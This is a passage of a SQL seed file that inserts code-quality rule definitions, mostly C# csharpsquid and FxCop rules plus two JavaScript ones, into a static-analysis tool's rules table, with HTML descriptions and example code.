INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (443, '"FIXME" tags should be handled', 'S1134', NULL, 'csharpsquid', '<p>
    <code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with
    later.
</p>
<p>
    Sometimes the developer will not have the time or will simply forget to get back to that tag.
</p>
<p>
    This rule is meant to track those tags, and ensure that they do not go unnoticed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
private int Divide(int numerator, int denominator)
{
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812322, 1510817812322, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (444, 'Flags enumerations should explicitly initialize all their members', 'S2345', NULL, 'csharpsquid', '<p>
    Flags enumerations should not rely on the language to initialize the values of their members. Implicit initialization
    will set the first member to 0, and increment the value by one for each subsequent member. This implicit behavior does
    not allow members to be combined using the bitwise or operator.
</p>
<p>
    Instead, powers of two, i.e. 1, 2, 4, 8, 16, etc. should be used to explicitly initialize all the members.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
[Flags]
enum FruitType    // Non-Compliant
{
    Banana,
    Orange,
    Strawberry
}
class Program
{
    static void Main()
    {
        var bananaAndStrawberry = FruitType.Banana | FruitType.Strawberry;
        // Will display only Strawberry!
        Console.WriteLine(bananaAndStrawberry.ToString());
    }
}
</pre>

<h2>Compliant Solution</h2>

<pre>
[Flags]
enum FruitType    // Non-Compliant
{
    Banana = 1,
    Orange = 2,
    Strawberry = 4
}
class Program
{
    static void Main()
    {
        var bananaAndStrawberry = FruitType.Banana | FruitType.Strawberry;
        // Will display Banana and Strawberry, as expected.
        Console.WriteLine(bananaAndStrawberry.ToString());
    }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812322, 1510817812323, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (445, '"TODO" tags should be handled', 'S1135', NULL, 'csharpsquid', '<p>
    <code>TODO</code> tags are commonly used to mark places where some more code is required, but which the
    developer wants to implement later.
</p>
<p>
    Sometimes the developer will not have the time or will simply forget to get back to that tag.
</p>
<p>
    This rule is meant to track those tags, and ensure that they do not go unnoticed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething()
{
  // TODO
}
</pre>', 0, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812324, 1510817812324, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (446, 'Enumeration type names should not have "Flags" or "Enum" suffixes', 'S2344', NULL, 'csharpsquid', '<p>
    The information that an enumeration type is actually an enumeration or a set of flags should not be duplicated in its name.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
enum FooFlags // Noncompliant
{
    Foo = 1
    Bar = 2
    Baz = 4
}
</pre>

<h2>Compliant Solution</h2>

<pre>
enum Foo
{
    Foo = 1
    Bar = 2
    Baz = 4
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812324, 1510817812325, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (447, 'Non-constant static fields should not be visible', 'S2223', NULL, 'csharpsquid', '<p>
    A <code>static</code> field that is neither constant nor read-only is not thread-safe. Correctly accessing
    these fields from different threads needs synchronization with <code>lock</code>s. Improper synchronization
    may lead to unexpected results, thus publicly visible static fields are best suited for storing non-changing
    data shared by many consumers. To enforce this intent, these fields should be marked <code>readonly</code> or
    converted to a constant.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Math
{
  public static double Pi = 3.14;  // Noncompliant
}
</pre>
or
<pre>
public class Shape
{
  public static Shape Empty = new EmptyShape();  // Noncompliant

  private class EmptyShape : Shape
  {
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class Math
{
  public const double Pi = 3.14;
}
</pre>
or
<pre>
public class Shape
{
  public static readonly Shape Empty = new EmptyShape();

  private class EmptyShape : Shape
  {
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812326, 1510817812326, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (448, 'Static fields should not be used in generic types', 'S2743', NULL, 'csharpsquid', '<p>
    A static field in a generic type is not shared among instances of different closed constructed types, thus <code>LengthLimitedSingletonCollection&lt;int&gt;.instances</code>
    and <code>LengthLimitedSingletonCollection&lt;string&gt;.instances</code> will point to different objects, even though <code>instances</code> is seemingly shared among all
    <code>LengthLimitedSingletonCollection&lt;&gt;</code> generic classes.
</p>
<p>
    If you need to have a static field shared among instances with different generic arguments, define a non-generic base class to store your static members, then set your generic type to inherit from the base class.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class LengthLimitedSingletonCollection&lt;T&gt; where T : new()
{
  protected const int MaxAllowedLength = 5;
  protected static Dictionary&lt;Type, object&gt; instances = new Dictionary&lt;Type, object&gt;(); // Noncompliant
  public static T GetInstance()
  {
    object instance;
    if (!instances.TryGetValue(typeof(T), out instance))
    {
      if (instances.Count >= MaxAllowedLength)
      {
        throw new Exception();
      }
      instance = new T();
      instances.Add(typeof(T), instance);
    }
    return (T)instance;
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class SingletonCollectionBase
{
  protected static Dictionary&lt;Type, object&gt; instances = new Dictionary&lt;Type, object&gt;();
}
public class LengthLimitedSingletonCollection&lt;T&gt; : SingletonCollectionBase where T : new()
{
  protected const int MaxAllowedLength = 5;
  public static T GetInstance()
  {
    object instance;
    if (!instances.TryGetValue(typeof(T), out instance))
    {
      if (instances.Count >= MaxAllowedLength)
      {
        throw new Exception();
      }
      instance = new T();
      instances.Add(typeof(T), instance);
    }
    return (T)instance;
  }
}
</pre>

<h2>Exception</h2>
<p>
    If the static field or property uses a type parameter, then the developer is assumed to understand that the static member is not shared among the closed constructed types.
</p>
<pre>
public class Cache&lt;T&gt;
{
  private static Dictionary&lt;string, T&gt; CacheDictionary { get; set; } // Compliant
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812327, 1510817812328, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (449, 'Flags enumerations zero-value members should be named "None"', 'S2346', NULL, 'csharpsquid', '<p>
    Consisitent use of "None" in flags enumerations indicates that all flag values are cleared.
    The value 0 should not be used to indicate any other state, since there is no way to check that the bit <code>0</code> is set.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
[Flags]
enum FruitType
{
    Void = 0,       // Non-Compliant
    Banana = 1,
    Orange = 2,
    Strawberry = 4
}
</pre>

<h2>Compliant Solution</h2>

<pre>
[Flags]
enum FruitType
{
    None = 0,       // Compliant
    Banana = 1,
    Orange = 2,
    Strawberry = 4
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812328, 1510817812329, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (450, '"ToString()" method should not return null', 'S2225', NULL, 'csharpsquid', '<p>
    Calling <code>ToString()</code> on an object should always return a string. Returning <code>null</code> instead contravenes the method''s implicit contract.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public override string ToString ()
{
  if (this.collection.Count == 0)
  {
    return null; // Noncompliant
  }
  else
  {
    // ...

</pre>

<h2>Compliant Solution</h2>
<pre>
public override string ToString ()
{
  if (this.collection.Count == 0)
  {
    return "";
  }
  else
  {
    // ...

</pre>

<h2>See</h2>

<ul>
    <li><a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cwe', false, 'HTML', 1510817812329, 1510817812330, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (451, 'CA2111: Pointers should not be visible', 'PointersShouldNotBeVisible', 'CA2111', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected <code>System.IntPtr</code> or <code>System.UIntPtr</code> field is not read-only.
</p>
<h2>Rule Description</h2>
<p>


                <code>IntPtr</code>
               and <code>UIntPtr</code> are pointer types that are used to access unmanaged memory. If a pointer is not private, internal, or read-only, malicious code can change the value of the pointer, potentially allowing access to arbitrary locations in memory or causing application or system failures.
            If you intend to secure access to the type that contains the pointer field, see {rule:fxcop:SecuredTypesShouldNotExposeFields}.
</p>
<h2>How to Fix Violations</h2>
<p>
            Secure the pointer by making it read-only, internal, or private.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule if you do not rely on the value of the pointer.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:SecuredTypesShouldNotExposeFields}<br/>




                {rule:fxcop:DoNotDeclareVisibleInstanceFields}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182306.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182306.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812332, 1510817812333, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (452, 'CA1403: Auto layout types should not be COM visible', 'AutoLayoutTypesShouldNotBeComVisible', 'CA1403', 'fxcop', '<h2>Cause</h2>
<p>
            A Component Object Model (COM) visible value type is marked with the <code>System.Runtime.InteropServices.StructLayoutAttribute</code> attribute set to <code>LayoutKind.Auto</code>.
</p>
<h2>Rule Description</h2>
<p>


                <code>Auto</code>
               layout types are managed by the common language runtime. The layout of these types can change between versions of the .NET Framework, which will break COM clients that expect a specific layout. Note that if the <code>StructLayoutAttribute</code> attribute is not specified, the C#, Visual Basic, and C++ compilers specify the <code>Sequential</code> layout for value types.
            Unless marked otherwise, all public nongeneric types are visible to COM; all nonpublic and generic types are invisible to COM. However, to reduce false positives, this rule requires the COM visibility of the type to be explicitly stated; the containing assembly must be marked with the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> set to <code>false</code> and the type must be marked with the <code>ComVisibleAttribute</code> set to <code>true</code>.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the value of the <code>StructLayoutAttribute</code> attribute to <code>Explicit</code> or <code>Sequential</code>, or make the type invisible to COM.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DoNotUseAutoDualClassInterfaceType}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182194.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182194.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812335, 1510817812335, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (453, 'CA2207: Initialize value type static fields inline', 'InitializeValueTypeStaticFieldsInline', 'CA2207', 'fxcop', '<h2>Cause</h2>
<p>
            A value-type declares an explicit static constructor.
</p>
<h2>Rule Description</h2>
<p>
            When a value-type is declared, it undergoes a default initialization where all value-type fields are set to zero and all reference-type fields are set to <code>null</code> (<code>Nothing</code> in Visual Basic). An explicit static constructor is only guaranteed to run before an instance constructor or static member of the type is called. Therefore, if the type is created without calling an instance constructor, the static constructor is not guaranteed to run.
            If all static data is initialized inline and no explicit static constructor is declared, the C# and Visual Basic compilers add the <code>beforefieldinit</code> flag to the MSIL class definition. The compilers also add a private static constructor that contains the static initialization code. This private static constructor is guaranteed to run before any static fields of the type are accessed.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule initialize all static data when it is declared and remove the static constructor.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:InitializeReferenceTypeStaticFieldsInline}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182346.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182346.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812337, 1510817812337, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (454, 'CA1814: Prefer jagged arrays over multidimensional', 'PreferJaggedArraysOverMultidimensional', 'CA1814', 'fxcop', '<h2>Cause</h2>
<p>
            A member is declared as a multidimensional array.
</p>
<h2>Rule Description</h2>
<p>
            A jagged array is an array whose elements are arrays. The arrays that make up the elements can be of different sizes, leading to less wasted space for some sets of data.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the multidimensional array to a jagged array.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule if the multidimensional array does not waste space.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182277.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182277.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812339, 1510817812339, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (455, 'CA5122: P/Invoke declarations should not be safe critical', 'PInvokesShouldNotBeSafeCriticalFxCopRule', 'CA5122', 'fxcop', '<h2>Cause</h2>
<p>
            A P/Invoke declaration has been marked with a <code>SecuritySafeCriticalAttribute</code>:









            <pre>
[assembly: AllowPartiallyTrustedCallers]

// ...
public class C
{
    [SecuritySafeCritical]
    [DllImport("kernel32.dll")]
    public static extern bool Beep(int frequency, int duration); // CA5122 – safe critical p/invoke
   }
</pre>




In this example, C.Beep(...) has been marked as a security safe critical method.






                Rule Description





</p>
<h2>How to Fix Violations</h2>
<p>
            To make a P/Invoke available to transparent code, expose a security safe critical wrapper method for it:









            <pre>
[assembly: AllowPartiallyTrustedCallers

class C
{
   [SecurityCritical]
   [DllImport(“kernel32.dll”, EntryPoint=”Beep”)]
   private static extern bool BeepPinvoke(int frequency, int duration); // Security Critical P/Invoke

   [SecuritySafeCritical]
   public static bool Beep(int frequency, int duration)
   {
      return BeepPInvoke(frequency, duration);
   }
}
</pre>











                When to Suppress Warnings





</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dn621099.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dn621099.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812341, 1510817812341, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (498, 'CA2120: Secure serialization constructors', 'SecureSerializationConstructors', 'CA2120', 'fxcop', '<h2>Cause</h2>
<p>
            The type implements the <code>System.Runtime.Serialization.ISerializable</code> interface, is not a delegate or interface, and is declared in an assembly that allows partially trusted callers. The type has a constructor that takes a <code>System.Runtime.Serialization.SerializationInfo</code> object and a <code>System.Runtime.Serialization.StreamingContext</code> object (the signature of the serialization constructor). This constructor is not secured by a security check, but one or more of the regular constructors in the type is secured.
</p>
<h2>Rule Description</h2>
<p>
            This rule is relevant for types that support custom serialization. A type supports custom serialization if it implements the <code>System.Runtime.Serialization.ISerializable</code> interface. The serialization constructor is required and is used to de-serialize, or re-create objects that have been serialized using the <code>ISerializable.GetObjectData</code> method. Because the serialization constructor allocates and initializes objects, security checks that are present on regular constructors must also be present on the serialization constructor. If you violate this rule, callers that could not otherwise create an instance could use the serialization constructor to do this.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, protect the serialization constructor with security demands that are identical to those protecting other constructors.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a violation of the rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:ImplementSerializationConstructors}<br/>




                {rule:fxcop:MarkISerializableTypesWithSerializable}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182317.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182317.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812397, 1510817812398, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (456, 'CA1303: Do not pass literals as localized parameters', 'DoNotPassLiteralsAsLocalizedParameters', 'CA1303', 'fxcop', '<h2>Cause</h2>
<p>
            A method passes a string literal as a parameter to a constructor or method in the .NET Framework class library and that string should be localizable.
            This warning is raised when a literal string is passed as a value to a parameter or property and one or more of the following cases is true:
            <ul>
              <li>
                The <code>LocalizableAttribute</code> attribute of the parameter or property is set to true.
              </li>
              <li>
                The parameter or property name contains "Text", "Message", or "Caption".
              </li>
              <li>
                The name of the string parameter that is passed to a Console.Write or Console.WriteLine method is either "value" or "format".
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            String literals that are embedded in source code are difficult to localize.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, replace the string literal with a string retrieved through an instance of the <code>ResourceManager</code> class.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the code library will not be localized, or if the string is not exposed to the end user or a developer using the code library.
            Users can eliminate noise against methods which should not be passed localized strings by either renaming the parameter or property named, or by marking these items as conditional.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182187.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182187.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812342, 1510817812343, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (457, 'CA2001: Avoid calling problematic methods', 'AvoidCallingProblematicMethods', 'CA2001', 'fxcop', '<h2>Cause</h2>
<p>
            A member calls a potentially dangerous or problematic method.
</p>
<h2>Rule Description</h2>
<p>
            Avoid making unnecessary and potentially dangerous method calls.
            A violation of this rule occurs when a member calls one of the following methods.







                    Method


                    Description






                        <code>GC.Collect</code>




                    Calling GC.Collect can significantly affect application performance and is rarely necessary. For more information, see the Rico Mariani''s Performance Tidbits blog entry on MSDN.






                        <code>Thread.Resume</code>




                        <code>Thread.Suspend</code>




                    Thread.Suspend and Thread.Resume have been deprecated because of their unpredictable behavior.  Use other classes in the <code>System.Threading</code> namespace, such as <code>Monitor</code>, [T:System.Threading.Mutex,] <code>Mutex</code>, and <code>Semaphore</code> to synchronize threads or protect resources.






                        <code>SafeHandle.DangerousGetHandle</code>




                    The DangerousGetHandle method poses a security risk because it can return a handle that is not valid. See the <code>DangerousAddRef</code>  and the <code>DangerousRelease</code> methods for more information about how to use the DangerousGetHandle method safely.






                        <code>Assembly.LoadFrom</code>




                        <code>Assembly.LoadFile</code>




                        <code>Assembly.LoadWithPartialName</code>




                    These methods can load assemblies from unexpected locations. For example, see Suzanne Cook''s .NET CLR Notes blog posts LoadFile vs. LoadFrom and Choosing a Binding Context on the MSDN Web site for information about methods that load assemblies.





                      CoSetProxyBlanket (Ole32)

                      CoInitializeSecurity (Ole32)


                    By the time the user code starts executing in a managed process, it is too late to reliably call CoSetProxyBlanket. The common language runtime (CLR) takes initialization actions that may prevent the users P/Invoke from succeeding.
                    If you do have to call CoSetProxyBlanket for a managed application, we recommend that you start the process by using a native code (C++) executable, call CoSetProxyBlanket in the native code, and then start your managed code application in process. (Be sure to specify a runtime version number.)




</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove or replace the call to the dangerous or problematic method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            You should suppress messages from this rule only when no alternatives to the problematic method are available.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb385973.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb385973.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '20min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812344, 1510817812344, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1221, 'Collapsible "if" statements should be merged', 'CollapsibleIfStatements', NULL, 'javascript', '<p>Merging collapsible <code>if</code> statements increases the code''s readability.</p>
<h2>Noncompliant Code Example</h2>

<pre>
if (x != undefined) {
  if (x === 2) {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>

<pre>
if (x != undefined &amp;&amp; x === 2) {
  // ...
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813349, 1510817813349, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1222, 'Function call arguments should not start on new line', 'S1472', NULL, 'javascript', '<p>Because semicolons at the ends of statements are optional, starting function call arguments on a separate line makes the code confusing. It could lead to errors and most likely <em>will</em> lead to questions for maintainers.</p>
<p>What was the initial purpose of the developer ?</p>
<ol>
<li> Was it to define a function and then to execute some unrelated code inside a closure ?</li>
<li> Or to pass the second function as a parameter to the first one ?</li>
</ol>
<p>The first option will be the one chosen by the JavaScript interpreter..</p>
<h2>Noncompliant Code Example</h2>

<pre>
var fn = function () {
  //...
}

(function () { // Noncompliant
  //...
})();
</pre>
<h2>Compliant Solution</h2>

<p>Either</p>
<pre>
// define a function
var fn = function () {
  //...
}; // &lt;-- semicolon added

// then execute some code inside a closure
(function () {
  //...
})();
</pre>
<p>Or </p>
<pre>
var fn = function () {
  //...
}(function () { // &lt;-- start function call arguments on same line
  //...
})();
</pre>
<p>By extension and to improve readability, any kind of function call arguments should not start on new line.</p>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813350, 1510817813350, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (458, 'CA2115: Call GC.KeepAlive when using native resources', 'CallGCKeepAliveWhenUsingNativeResources', 'CA2115', 'fxcop', '<h2>Cause</h2>
<p>
            A method declared in a type with a finalizer references a <code>System.IntPtr</code> or <code>System.UIntPtr</code> field, but does not call <code>GC.KeepAlive</code>.
</p>
<h2>Rule Description</h2>
<p>
            Garbage collection finalizes an object if there are no more references to it in managed code. Unmanaged references to objects do not prevent garbage collection. This rule detects errors that might occur because an unmanaged resource is being finalized while it is still being used in unmanaged code.
            This rule assumes that <code>IntPtr</code> and <code>UIntPtr</code> fields store pointers to unmanaged resources. Because the purpose of a finalizer is to free unmanaged resources, the rule assumes that the finalizer will free the unmanaged resource pointed to by the pointer fields. This rule also assumes that the method is referencing the pointer field to pass the unmanaged resource to unmanaged code.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add a call to <code>KeepAlive</code> to the method, passing the current instance (<code>this</code> in C# and C++) as the argument. Position the call after the last line of code where the object must be protected from garbage collection. Immediately after the call to <code>KeepAlive</code>, the object is again considered ready for garbage collection assuming that there are no managed references to it.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            This rule makes some assumptions that can lead to false positives. You can safely suppress a warning from this rule if:
            <ul>
              <li>
                The finalizer does not free the contents of the <code>IntPtr</code> or <code>UIntPtr</code> field referenced by the method.
              </li>
              <li>
                The method does not pass the <code>IntPtr</code> or <code>UIntPtr</code> field to unmanaged code.
              </li>
            </ul>
